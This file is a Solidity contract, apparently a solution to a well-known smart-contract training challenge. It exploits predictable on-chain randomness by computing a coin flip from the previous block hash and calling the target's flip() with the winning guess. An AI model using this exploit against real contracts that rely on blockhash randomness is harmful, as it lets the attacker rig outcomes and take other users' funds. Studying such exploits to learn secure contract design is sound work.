// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    uint256 s_lastHash;
    ICoinFlip s_coinFlip;

    constructor(address _coinFlip) {
        s_coinFlip = ICoinFlip(_coinFlip);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (s_lastHash == blockValue) {
            revert();
        }

        s_lastHash = blockValue;
        bool side = _guessSide(blockValue);

        s_coinFlip.flip(side);
    }

    function _guessSide(uint256 _blockValue) private pure returns (bool) {
        uint256 coinFlip = _blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }
}
